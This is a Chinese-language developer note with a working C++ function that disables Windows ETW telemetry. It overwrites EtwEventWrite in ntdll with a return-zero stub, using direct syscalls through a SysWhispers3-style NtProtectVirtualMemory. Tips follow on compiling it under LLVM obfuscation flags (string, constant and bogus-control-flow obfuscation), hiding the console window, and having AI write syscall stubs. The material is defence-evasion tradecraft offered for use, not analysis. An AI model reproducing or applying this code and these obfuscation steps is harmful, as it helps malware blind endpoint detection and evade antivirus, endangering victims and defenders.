### 采用syscall成功实现的patch_ETW功能
```CPP
void patch_ew() {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return;

	PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
	if (!pEtwEventWrite) return;

	// x86: mov eax, 0; ret
	BYTE patch[] = { 0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xC3 };
	SIZE_T RegionSize = sizeof(patch);
	ULONG oldProtect;

	// 使用 NtProtectVirtualMemory 修改内存保护
	NTSTATUS status = Sw3NtProtectVirtualMemory(
		GetCurrentProcess(),
		&pEtwEventWrite,
		&RegionSize,
		PAGE_EXECUTE_READWRITE,
		&oldProtect
	);
	if (status != 0) return;  // 0 = STATUS_SUCCESS

	// 应用 patch
	memcpy(pEtwEventWrite, patch, sizeof(patch));

	// 恢复内存保护
	Sw3NtProtectVirtualMemory(
		GetCurrentProcess(),
		&pEtwEventWrite,
		&RegionSize,
		oldProtect,
		&oldProtect
	);
}
```
1. 上述代码为可以成功执行的syscall的patch_etw功能的代码
2. 错误点就是对于syscallwh3项目中的函数的参数以及参数的类型不对问题，解决方法就是自己根据头文件的函数参数去AI看每个参数的意思，一定要搞清楚自己这个函数是干什么用的，流程是什么，自己根据AI的参数意思去仔细检查每个变量的传参是否有问题
3. 一定要注意语句的先后顺序，不能错
4. 一定要注意关于字节大小一定要用函数`sizeof()`去计算之后申请
5. 一定要注意变量的类型，函数中每个参数的类型，类型不同注意转换
6. 经过调试发现，有时候采用了syscall之后再去用llvm混淆可能第一次混淆行，在重新生成就不行了，很不稳定，这个时候可以在个别函数上采用非syscall函数，同样也是llvm混淆就可以
7. 有时测试发现编译参数改成窗口时就不能运行，改成控制台就行，这个时候就要自己手动加隐藏黑窗口的代码，再经过llvm混淆编译
8. 经过测试发现，大部分时候采用msvc编译基本没问题，但是采用llvm混淆编译就会出现问题，这个时候就要自己手动修改llvm混淆命令去测试，先问一下AI自己的问题可能与所混淆的哪个命令出现问题，然后再去修改调试，一些高风险指令应该先去降低循环使用的过程：`-mllvm -string-obfus -mllvm -const-obfus`
9. 如果syscall的函数不会写，先不要自己尝试去写，可以利用AI按照ntdll中的函数去写，写完改一些类型，函数名称就好
10. <mark style="background: #FF5582A6;">重点注意</mark>混淆代码千万别重复：类似虚假控制流 (`-mllvm -bcf`, `-bcf_loop=1`, `-bcf_prob=10`)这种`-mllvm -bcf_loop=1`已经对虚假控制流做了改变不要在加上`-mllvm -bcf`命令了
